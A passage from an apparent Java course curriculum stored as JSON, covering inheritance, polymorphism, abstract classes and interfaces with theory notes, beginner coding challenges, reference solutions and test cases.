                  "id": "epoch-2-lesson-4-vehicle-test-2",
                  "description": "Car c = new Car(\"Toyota\", 2022, 4);\nreturn c.getInfo();",
                  "expectedOutput": "Toyota (2022)",
                  "isVisible": true
                },
                {
                  "id": "epoch-2-lesson-4-vehicle-test-3",
                  "description": "Car c = new Car(\"Honda\", 2023, 2);\nreturn c.doors;",
                  "expectedOutput": "2",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 2,
                  "text": "Define a function using the java syntax. Don't forget the return statement if needed."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            },
            {
              "type": "FREE_CODING",
              "id": "epoch-2-lesson-4-employee",
              "title": "Employee Hierarchy",
              "description": "Create:\n1. Person class with: String name, int age\n2. Employee class extending Person with: double salary\n3. Both should have constructors\n4. Employee should have getSalary() method",
              "instructions": "Create:\n1. Person class with: String name, int age\n2. Employee class extending Person with: double salary\n3. Both should have constructors\n4. Employee should have getSalary() method",
              "starterCode": "class Person {\n    // Your code here\n}\n\nclass Employee extends Person {\n    // Your code here\n}",
              "solution": "// Solution: Employee Hierarchy\n// This demonstrates inheritance with Person as parent class\n\nclass Person {\n    String name;\n    int age;\n    \n    // Constructor\n    public Person(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n}\n\nclass Employee extends Person {\n    double salary;\n    \n    // Constructor calls super to initialize Person fields\n    public Employee(String name, int age, double salary) {\n        super(name, age);  // Call Person constructor\n        this.salary = salary;\n    }\n    \n    // Getter for salary\n    public double getSalary() {\n        return salary;\n    }\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-2-lesson-4-employee-test-1",
                  "description": "Person p = new Person(\"Alice\", 30);\nreturn p.name;",
                  "expectedOutput": "Alice",
                  "isVisible": true
                },
                {
                  "id": "epoch-2-lesson-4-employee-test-2",
                  "description": "Employee e = new Employee(\"Bob\", 35, 50000.0);\nreturn e.name;",
                  "expectedOutput": "Bob",
                  "isVisible": true
                },
                {
                  "id": "epoch-2-lesson-4-employee-test-3",
                  "description": "Employee e = new Employee(\"Carol\", 28, 60000.0);\nreturn e.getSalary();",
                  "expectedOutput": "60000.0",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 2,
                  "text": "Define a function using the java syntax. Don't forget the return statement if needed."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            },
            {
              "type": "FREE_CODING",
              "id": "epoch-2-lesson-4-shape",
              "title": "Shape Hierarchy",
              "description": "Create:\n1. Shape class with: String color field and constructor\n2. Rectangle class extending Shape with: int width, int height\n3. Rectangle constructor should call super(color) and set width/height\n4. Rectangle should have getArea() method returning width * height",
              "instructions": "Create:\n1. Shape class with: String color field and constructor\n2. Rectangle class extending Shape with: int width, int height\n3. Rectangle constructor should call super(color) and set width/height\n4. Rectangle should have getArea() method returning width * height",
              "starterCode": "class Shape {\n    // Your code here\n}\n\nclass Rectangle extends Shape {\n    // Your code here\n}",
              "solution": "// Solution: Shape Hierarchy\n// This demonstrates inheritance with constructors and methods\n\nclass Shape {\n    String color;\n    \n    // Constructor to set color\n    public Shape(String color) {\n        this.color = color;\n    }\n}\n\nclass Rectangle extends Shape {\n    int width;\n    int height;\n    \n    // Constructor calls super to set color, then sets dimensions\n    public Rectangle(String color, int width, int height) {\n        super(color);  // Call Shape constructor\n        this.width = width;\n        this.height = height;\n    }\n    \n    // Calculate and return the area\n    public int getArea() {\n        return width * height;\n    }\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-2-lesson-4-shape-test-1",
                  "description": "Rectangle r = new Rectangle(\"red\", 5, 10);\nreturn r.color;",
                  "expectedOutput": "red",
                  "isVisible": true
                },
                {
                  "id": "epoch-2-lesson-4-shape-test-2",
                  "description": "Rectangle r = new Rectangle(\"blue\", 4, 6);\nreturn r.getArea();",
                  "expectedOutput": "24",
                  "isVisible": true
                },
                {
                  "id": "epoch-2-lesson-4-shape-test-3",
                  "description": "Rectangle r = new Rectangle(\"green\", 7, 3);\nreturn r.getArea();",
                  "expectedOutput": "21",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 2,
                  "text": "Define a function using the java syntax. Don't forget the return statement if needed."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "epoch-2-lesson-5",
          "title": "Lesson 4.5: Polymorphism - One Interface, Many Forms",
          "moduleId": "module-04",
          "order": 5,
          "estimatedMinutes": 40,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Different Animals Make Different Sounds",
              "content": "You have an Animal class with a makeSound() method:\n\nclass Animal {\n    void makeSound() {\n        System.out.println(\"Generic animal sound\");\n    }\n}\n\nclass Dog extends Animal {\n    // Inherits makeSound(), but dogs don't make \"generic animal sounds\"!\n}\n\nclass Cat extends Animal {\n    // Same problem - cats meow, not generic sounds\n}\n\nWe need a way for EACH subclass to have its OWN implementation\nof makeSound() while still being treated as Animals.\n\nSolution: METHOD OVERRIDING + POLYMORPHISM"
            },
            {
              "type": "KEY_POINT",
              "title": "Polymorphism is Like a Universal Remote",
              "content": "UNIVERSAL REMOTE:\n- Has a \"Power\" button\n- Works for TV, DVD player, sound system\n- SAME button, DIFFERENT behavior depending on device\n\nPOLYMORPHISM IN JAVA:\nAnimal[] animals = {new Dog(), new Cat(), new Bird()};\n\nfor (Animal a : animals) {\n    a.makeSound();  // SAME method call\n}\n\nOutput:\nWoof!  (Dog's version)\nMeow!  (Cat's version)\nChirp!  (Bird's version)\n\nONE interface (makeSound), MANY forms (each animal's unique sound).\nThat's poly (many) + morph (forms) = polymorphism!"
            },
            {
              "type": "THEORY",
              "title": "Method Overriding with @Override",
              "content": "OVERRIDING = Replacing a parent method with your own version\n\nclass Animal {\n    public void makeSound() {\n        System.out.println(\"Generic sound\");\n    }\n}\n\nclass Dog extends Animal {\n    @Override  // ANNOTATION - tells Java \"I'm overriding\"\n    public void makeSound() {\n        System.out.println(\"Woof!\");\n    }\n}\n\nclass Cat extends Animal {\n    @Override\n    public void makeSound() {\n        System.out.println(\"Meow!\");\n    }\n}\n\nRULES FOR OVERRIDING:\n1. Same method name\n2. Same parameters (signature)\n3. Same or more accessible (public > protected > default > private)\n4. Use @Override annotation (optional but HIGHLY recommended)"
            },
            {
              "type": "THEORY",
              "title": "Polymorphism in Action",
              "content": "The MAGIC of polymorphism:\n\nAnimal myPet = new Dog();  // Dog IS-A Animal\nmyPet.makeSound();  // Calls Dog's version → \"Woof!\"\n\nmyPet = new Cat();  // Now it's a Cat\nmyPet.makeSound();  // Calls Cat's version → \"Meow!\"\n\nThis enables POWERFUL patterns:\n\nvoid feedAnimal(Animal a) {\n    System.out.println(\"Feeding...\");\n    a.makeSound();  // Will call the RIGHT version automatically!\n}\n\nfeedAnimal(new Dog());  // \"Feeding...\" then \"Woof!\"\nfeedAnimal(new Cat());  // \"Feeding...\" then \"Meow!\"\nfeedAnimal(new Bird());  // \"Feeding...\" then \"Chirp!\"\n\nONE method works with ALL Animal types!"
            },
            {
              "type": "KEY_POINT",
              "title": "Dynamic Method Dispatch",
              "content": "HOW does Java know which version to call?\n\nAnimal a = new Dog();\na.makeSound();  // Which makeSound()?\n\nJava uses DYNAMIC DISPATCH (runtime polymorphism):\n1. Looks at the ACTUAL object type (Dog)\n2. Finds the method in Dog's class\n3. Calls Dog's version, not Animal's\n\nThis happens at RUNTIME, not compile time!\n\nKEY INSIGHT:\n- Variable type (Animal) determines WHAT methods are available\n- Object type (Dog) determines WHICH version gets called\n\nThis is the foundation of flexible, extensible code!"
            },
            {
              "type": "THEORY",
              "title": "Overriding vs Overloading - Don't Confuse Them!",
              "content": "OVERRIDING (this lesson):\n- SAME method signature in child class\n- REPLACES parent's version\n- Requires inheritance\n\nclass Animal {\n    void eat() { ... }\n}\nclass Dog extends Animal {\n    @Override\n    void eat() { ... }  // OVERRIDING\n}\n\nOVERLOADING (Epoch 1):\n- DIFFERENT parameters, same name\n- ADDS new version\n- Same class\n\nclass Calculator {\n    int add(int a, int b) { ... }\n    double add(double a, double b) { ... }  // OVERLOADING\n}"
            },
            {
              "type": "WARNING",
              "title": "Common Polymorphism Pitfalls",
              "content": "1. FORGETTING @Override ANNOTATION:\nWithout @Override, typos create NEW methods instead of overriding!\n\nclass Dog extends Animal {\n    public void makesound() { ... }  // TYPO! New method, not override\n}\n\nWith @Override, the compiler catches the error.\n\n2. CALLING OVERRIDABLE METHODS IN CONSTRUCTORS:\nNever call non-final methods from constructors - subclass fields are not initialized yet!\n\nclass Animal {\n    Animal() { makeSound(); }  // DANGEROUS!\n}\n\n3. EXCESSIVE DOWNCASTING:\nAvoid casting parent to child type - it defeats polymorphism:\nAnimal a = new Dog();\n((Dog) a).fetch();  // BAD - redesign with polymorphism\n\n4. REDUCING VISIBILITY:\nOverriding methods cannot be MORE restrictive:\npublic in parent -> must be public in child\n\n5. MODERN ALTERNATIVE - SEALED CLASSES (Java 17+):\nFor controlled hierarchies, consider sealed classes to restrict which classes can extend yours."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "epoch-2-lesson-5-animal",
              "title": "Override Animal Sounds",
              "description": "Complete the code:\n1. Animal class has makeSound() that returns \"Some sound\"\n2. Dog class overrides makeSound() to return \"Bark\"\n3. Cat class overrides makeSound() to return \"Meow\"",
              "instructions": "Complete the code:\n1. Animal class has makeSound() that returns \"Some sound\"\n2. Dog class overrides makeSound() to return \"Bark\"\n3. Cat class overrides makeSound() to return \"Meow\"",
              "starterCode": "class Animal {\n    public String makeSound() {\n        return \"Some sound\";\n    }\n}\n\nclass Dog extends Animal {\n    // Override makeSound here\n}\n\nclass Cat extends Animal {\n    // Override makeSound here\n}",
              "solution": "// Solution: Override Animal Sounds\n// This demonstrates polymorphism and method overriding\n\nclass Animal {\n    public String makeSound() {\n        return \"Some sound\";\n    }\n}\n\nclass Dog extends Animal {\n    // Override makeSound to return \"Bark\"\n    // @Override annotation is best practice\n    @Override\n    public String makeSound() {\n        return \"Bark\";\n    }\n}\n\nclass Cat extends Animal {\n    // Override makeSound to return \"Meow\"\n    @Override\n    public String makeSound() {\n        return \"Meow\";\n    }\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-2-lesson-5-animal-test-1",
                  "description": "Animal a = new Animal();\nreturn a.makeSound();",
                  "expectedOutput": "Some sound",
                  "isVisible": true
                },
                {
                  "id": "epoch-2-lesson-5-animal-test-2",
                  "description": "Dog d = new Dog();\nreturn d.makeSound();",
                  "expectedOutput": "Bark",
                  "isVisible": true
                },
                {
                  "id": "epoch-2-lesson-5-animal-test-3",
                  "description": "Cat c = new Cat();\nreturn c.makeSound();",
                  "expectedOutput": "Meow",
                  "isVisible": true
                },
                {
                  "id": "epoch-2-lesson-5-animal-test-4",
                  "description": "Animal a = new Dog();\nreturn a.makeSound();",
                  "expectedOutput": "Bark",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Read the instructions carefully and break down the problem into smaller steps."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            },
            {
              "type": "FREE_CODING",
              "id": "epoch-2-lesson-5-shape",
              "title": "Polymorphic Shape Areas",
              "description": "Create:\n1. Shape class with getArea() returning 0.0\n2. Circle class with radius field, overriding getArea() to return π * r²\n3. Rectangle class with width and height, overriding getArea() to return width * height\nUse Math.PI for π",
              "instructions": "Create:\n1. Shape class with getArea() returning 0.0\n2. Circle class with radius field, overriding getArea() to return π * r²\n3. Rectangle class with width and height, overriding getArea() to return width * height\nUse Math.PI for π",
              "starterCode": "class Shape {\n    public double getArea() {\n        return 0.0;\n    }\n}\n\nclass Circle extends Shape {\n    double radius;\n    \n    public Circle(double radius) {\n        this.radius = radius;\n    }\n    \n    // Override getArea here\n}\n\nclass Rectangle extends Shape {\n    int width, height;\n    \n    public Rectangle(int width, int height) {\n        this.width = width;\n        this.height = height;\n    }\n    \n    // Override getArea here\n}",
              "solution": "// Solution: Polymorphic Shape Areas\n// This demonstrates polymorphism with different shape calculations\n\nclass Shape {\n    public double getArea() {\n        return 0.0;\n    }\n}\n\nclass Circle extends Shape {\n    double radius;\n    \n    public Circle(double radius) {\n        this.radius = radius;\n    }\n    \n    // Override getArea to calculate circle area: PI * r^2\n    @Override\n    public double getArea() {\n        return Math.PI * radius * radius;\n    }\n}\n\nclass Rectangle extends Shape {\n    int width, height;\n    \n    public Rectangle(int width, int height) {\n        this.width = width;\n        this.height = height;\n    }\n    \n    // Override getArea to calculate rectangle area: width * height\n    @Override\n    public double getArea() {\n        return width * height;\n    }\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-2-lesson-5-shape-test-1",
                  "description": "Circle c = new Circle(5.0);\nreturn Math.abs(c.getArea() - 78.54) < 0.1;",
                  "expectedOutput": "true",
                  "isVisible": true
                },
                {
                  "id": "epoch-2-lesson-5-shape-test-2",
                  "description": "Rectangle r = new Rectangle(4, 5);\nreturn r.getArea();",
                  "expectedOutput": "20.0",
                  "isVisible": true
                },
                {
                  "id": "epoch-2-lesson-5-shape-test-3",
                  "description": "Shape s = new Circle(10.0);\nreturn s.getArea() > 300.0 && s.getArea() < 320.0;",
                  "expectedOutput": "true",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Read the instructions carefully and break down the problem into smaller steps."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            },
            {
              "type": "FREE_CODING",
              "id": "epoch-2-lesson-5-vehicle",
              "title": "Vehicle Start Methods",
              "description": "Create:\n1. Vehicle class with start() method returning \"Starting vehicle\"\n2. Car class overriding start() to return \"Turning key, engine starts\"\n3. Motorcycle class overriding start() to return \"Kick-starting engine\"",
              "instructions": "Create:\n1. Vehicle class with start() method returning \"Starting vehicle\"\n2. Car class overriding start() to return \"Turning key, engine starts\"\n3. Motorcycle class overriding start() to return \"Kick-starting engine\"",
              "starterCode": "class Vehicle {\n    // Your code here\n}\n\nclass Car extends Vehicle {\n    // Your code here\n}\n\nclass Motorcycle extends Vehicle {\n    // Your code here\n}",
              "solution": "// Solution: Vehicle Start Methods\n// This demonstrates polymorphism with vehicle start methods\n\nclass Vehicle {\n    // Base start method\n    public String start() {\n        return \"Starting vehicle\";\n    }\n}\n\nclass Car extends Vehicle {\n    // Override start for Car behavior\n    @Override\n    public String start() {\n        return \"Turning key, engine starts\";\n    }\n}\n\nclass Motorcycle extends Vehicle {\n    // Override start for Motorcycle behavior\n    @Override\n    public String start() {\n        return \"Kick-starting engine\";\n    }\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-2-lesson-5-vehicle-test-1",
                  "description": "Vehicle v = new Vehicle();\nreturn v.start();",
                  "expectedOutput": "Starting vehicle",
                  "isVisible": true
                },
                {
                  "id": "epoch-2-lesson-5-vehicle-test-2",
                  "description": "Car c = new Car();\nreturn c.start();",
                  "expectedOutput": "Turning key, engine starts",
                  "isVisible": true
                },
                {
                  "id": "epoch-2-lesson-5-vehicle-test-3",
                  "description": "Motorcycle m = new Motorcycle();\nreturn m.start();",
                  "expectedOutput": "Kick-starting engine",
                  "isVisible": true
                },
                {
                  "id": "epoch-2-lesson-5-vehicle-test-4",
                  "description": "Vehicle v = new Car();\nreturn v.start();",
                  "expectedOutput": "Turning key, engine starts",
                  "isVisible": false
                }
              ],
              "hints": [
                {
                  "level": 2,
                  "text": "Define a function using the java syntax. Don't forget the return statement if needed."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "epoch-2-lesson-6",
          "title": "Lesson 4.6: Abstract Classes & Interfaces - Enforcing Contracts",
          "moduleId": "module-04",
          "order": 6,
          "estimatedMinutes": 45,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Incomplete Parent Classes",
              "content": "Remember our Animal example?\n\nclass Animal {\n    public void makeSound() {\n        System.out.println(\"Generic sound\");  // What IS a generic sound?\n    }\n}\n\nProblems:\n1. There's no such thing as a \"generic animal\" - it's too abstract\n2. What if someone creates: Animal a = new Animal()?\n3. What if a subclass FORGETS to override makeSound()?\n\nWe need a way to say:\n- \"Animal is a concept, not a real thing\" (can't instantiate)\n- \"Every subclass MUST implement makeSound()\" (enforce contract)\n\nSolution: ABSTRACT CLASSES"
            },
            {
              "type": "THEORY",
              "title": "Abstract Classes: Templates with Rules",
              "content": "ABSTRACT CLASS = Class that CANNOT be instantiated\nABSTRACT METHOD = Method with NO implementation (body)\n\nabstract class Animal {  // Can't do: new Animal()\n    protected String name;\n    \n    public Animal(String name) {\n        this.name = name;\n    }\n    \n    // ABSTRACT METHOD - no body, must be overridden\n    public abstract void makeSound();\n    \n    // CONCRETE METHOD - has implementation\n    public void sleep() {\n        System.out.println(name + \" is sleeping.\");\n    }\n}\n\nclass Dog extends Animal {\n    public Dog(String name) {\n        super(name);\n    }\n    \n    @Override\n    public void makeSound() {  // MUST implement this!\n        System.out.println(\"Woof!\");\n    }\n}\n\n// Animal a = new Animal(\"Generic\");  // COMPILE ERROR!\nDog d = new Dog(\"Buddy\");  // Works!\nd.makeSound();  // \"Woof!\"\nd.sleep();  // \"Buddy is sleeping.\" (inherited)"
            },
            {
              "type": "KEY_POINT",
              "title": "Abstract Class is Like a Cake Recipe Template",
              "content": "ABSTRACT CLASS = Recipe template with mandatory steps:\n\nRecipe Template:\n1. Prepare batter (ABSTRACT - each cake type does it differently)\n2. Pour into pan (CONCRETE - same for all cakes)\n3. Bake (CONCRETE - same for all)\n4. Decorate (ABSTRACT - each cake type unique)\n\nYou can't make a \"generic cake\" from the template.\nYou must make: Chocolate Cake, Vanilla Cake, etc.\nEach MUST specify how to prepare batter and decorate.\n\nJAVA:\nabstract class Recipe {  // Can't instantiate\n    abstract void prepareBatter();  // MUST implement\n    void pourIntoPan() { ... }  // Inherited as-is\n    void bake() { ... }  // Inherited as-is\n    abstract void decorate();  // MUST implement\n}\n\nclass ChocolateCake extends Recipe {\n    void prepareBatter() { /* chocolate batter */ }\n    void decorate() { /* chocolate frosting */ }\n}"
            },
            {
              "type": "THEORY",
              "title": "Interfaces: Pure Contracts",
              "content": "INTERFACE = 100% abstract contract (no implementation)\nBefore Java 8, interfaces had ONLY abstract methods.\n\ninterface Flyable {\n    void fly();  // public abstract (automatically)\n    void land();\n}\n\nclass Bird implements Flyable {\n    @Override\n    public void fly() {\n        System.out.println(\"Flapping wings!\");\n    }\n    \n    @Override\n    public void land() {\n        System.out.println(\"Landing on branch.\");\n    }\n}\n\nclass Airplane implements Flyable {\n    @Override\n    public void fly() {\n        System.out.println(\"Jet engines roaring!\");\n    }\n    \n    @Override\n    public void land() {\n        System.out.println(\"Landing on runway.\");\n    }\n}\n\nKEY: Bird and Airplane are NOT related by inheritance,\nbut BOTH can be treated as Flyable!"
            },
            {
              "type": "THEORY",
              "title": "Abstract Class vs Interface - When to Use What?",
              "content": "ABSTRACT CLASS:\n✓ IS-A relationship (Dog IS-A Animal)\n✓ Share CODE between subclasses (common fields, methods)\n✓ Has state (fields)\n✓ Single inheritance only\n\nExample:\nabstract class Animal {  // Common state and behavior\n    String name;\n    abstract void makeSound();\n    void sleep() { ... }  // Shared implementation\n}\n\nINTERFACE:\n✓ CAN-DO relationship (Bird CAN fly, Dog CAN swim)\n✓ Define BEHAVIOR contract, no implementation (pre-Java 8)\n✓ No state (no fields, except constants)\n✓ Multiple implementation allowed!\n\nExample:\ninterface Flyable { void fly(); }\ninterface Swimmable { void swim(); }\n\nclass Duck implements Flyable, Swimmable {  // Multiple!\n    public void fly() { ... }\n    public void swim() { ... }\n}"
            },
            {
              "type": "KEY_POINT",
              "title": "Multiple Interfaces: Java's Alternative to Multiple Inheritance",
              "content": "Java doesn't allow:\nclass Dog extends Animal, Robot { }  // ERROR!\n\nBut DOES allow:\nclass RobotDog extends Robot implements Walkable, Barkable { }\n\nReal example:\ninterface Swimmable { void swim(); }\ninterface Flyable { void fly(); }\ninterface Walkable { void walk(); }\n\nclass Duck extends Animal implements Flyable, Swimmable, Walkable {\n    public void fly() { System.out.println(\"Flying\"); }\n    public void swim() { System.out.println(\"Swimming\"); }\n    public void walk() { System.out.println(\"Walking\"); }\n}\n\nNow Duck can be used as:\n- Animal (inheritance)\n- Flyable (interface)\n- Swimmable (interface)\n- Walkable (interface)\n\nThis is POWERFUL for flexible design!"
            },
            {
              "type": "WARNING",
              "title": "Common Abstract Classes and Interfaces Pitfalls",
              "content": "1. CONFUSING WHEN TO USE EACH:\n- Use ABSTRACT CLASS for IS-A with shared state/code\n- Use INTERFACE for CAN-DO behavior contracts\n\n2. FORGETTING abstract KEYWORD:\nclass Shape { abstract void draw(); }  // ERROR! Class must be abstract\n\n3. INTERFACE DEFAULT METHODS (Java 8+):\nInterfaces CAN have default implementations now:\ninterface Drawable {\n    default void draw() { System.out.println(\"Drawing...\"); }\n}\nBut use sparingly - can cause diamond problem!\n\n4. SEALED TYPES (Java 17+):\nFor controlled hierarchies, consider sealed classes/interfaces:\nsealed interface Shape permits Circle, Rectangle, Triangle {}\n\n5. FUNCTIONAL INTERFACES:\nInterfaces with ONE abstract method can be used with lambdas:\n@FunctionalInterface\ninterface Runnable { void run(); }\nRunnable r = () -> System.out.println(\"Running!\");"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "epoch-2-lesson-6-shape",
              "title": "Abstract Shape Class",
              "description": "Create:\n1. Abstract class Shape with: String color field, constructor, abstract method getArea()\n2. Circle class extending Shape with: double radius, constructor, getArea() implementation\n   (area = π * r²)",
              "instructions": "Create:\n1. Abstract class Shape with: String color field, constructor, abstract method getArea()\n2. Circle class extending Shape with: double radius, constructor, getArea() implementation\n   (area = π * r²)",
              "starterCode": "abstract class Shape {\n    // Your code here\n}\n\nclass Circle extends Shape {\n    // Your code here\n}",
              "solution": "// Solution: Abstract Shape Class\n// This demonstrates abstract classes with required method implementations\n\nabstract class Shape {\n    // Protected field accessible to subclasses\n    String color;\n    \n    // Constructor\n    public Shape(String color) {\n        this.color = color;\n    }\n    \n    // Abstract method - must be implemented by subclasses\n    public abstract double getArea();\n}\n\nclass Circle extends Shape {\n    double radius;\n    \n    // Constructor calls super to set color and sets radius\n    public Circle(String color, double radius) {\n        super(color);  // Call Shape constructor\n        this.radius = radius;\n    }\n    \n    // Implement the abstract method\n    @Override\n    public double getArea() {\n        return Math.PI * radius * radius;\n    }\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-2-lesson-6-shape-test-1",
                  "description": "Circle c = new Circle(\"red\", 5.0);\nreturn c.color;",
                  "expectedOutput": "red",
                  "isVisible": true
                },
                {
                  "id": "epoch-2-lesson-6-shape-test-2",
                  "description": "Circle c = new Circle(\"blue\", 10.0);\nreturn Math.abs(c.getArea() - 314.159) < 1.0;",
                  "expectedOutput": "true",
                  "isVisible": true
                },
                {
                  "id": "epoch-2-lesson-6-shape-test-3",
                  "description": "Circle c = new Circle(\"green\", 3.0);\nreturn c.getArea() > 28.0 && c.getArea() < 29.0;",
                  "expectedOutput": "true",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 2,
                  "text": "Define a function using the java syntax. Don't forget the return statement if needed."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            },
            {
              "type": "FREE_CODING",
              "id": "epoch-2-lesson-6-payment",
              "title": "Payment Interface",
              "description": "Create:\n1. Interface Payable with method: double calculatePayment()\n2. Class Employee implementing Payable with: double salary field, constructor,\n   calculatePayment() returning salary\n3. Class Contractor implementing Payable with: double hourlyRate, int hoursWorked,\n   constructor, calculatePayment() returning hourlyRate * hoursWorked",
              "instructions": "Create:\n1. Interface Payable with method: double calculatePayment()\n2. Class Employee implementing Payable with: double salary field, constructor,\n   calculatePayment() returning salary\n3. Class Contractor implementing Payable with: double hourlyRate, int hoursWorked,\n   constructor, calculatePayment() returning hourlyRate * hoursWorked",
              "starterCode": "interface Payable {\n    // Your code here\n}\n\nclass Employee implements Payable {\n    // Your code here\n}\n\nclass Contractor implements Payable {\n    // Your code here\n}",
              "solution": "// Solution: Payment Interface\n// This demonstrates interfaces defining contracts\n\ninterface Payable {\n    // Interface method - no body, must be implemented\n    double calculatePayment();\n}\n\nclass Employee implements Payable {\n    double salary;\n    \n    // Constructor\n    public Employee(double salary) {\n        this.salary = salary;\n    }\n    \n    // Implement the interface method\n    @Override\n    public double calculatePayment() {\n        return salary;\n    }\n}\n\nclass Contractor implements Payable {\n    double hourlyRate;\n    int hoursWorked;\n    \n    // Constructor\n    public Contractor(double hourlyRate, int hoursWorked) {\n        this.hourlyRate = hourlyRate;\n        this.hoursWorked = hoursWorked;\n    }\n    \n    // Implement the interface method\n    @Override\n    public double calculatePayment() {\n        return hourlyRate * hoursWorked;\n    }\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-2-lesson-6-payment-test-1",
                  "description": "Employee e = new Employee(5000.0);\nreturn e.calculatePayment();",
                  "expectedOutput": "5000.0",
                  "isVisible": true
                },
                {
                  "id": "epoch-2-lesson-6-payment-test-2",
                  "description": "Contractor c = new Contractor(50.0, 40);\nreturn c.calculatePayment();",
                  "expectedOutput": "2000.0",
                  "isVisible": true
                },
                {
                  "id": "epoch-2-lesson-6-payment-test-3",
                  "description": "Payable p = new Employee(3000.0);\nreturn p.calculatePayment();",
                  "expectedOutput": "3000.0",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 2,
                  "text": "Define a function using the java syntax. Don't forget the return statement if needed."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            },
            {
              "type": "FREE_CODING",
              "id": "epoch-2-lesson-6-multiple",
              "title": "Multiple Interfaces",
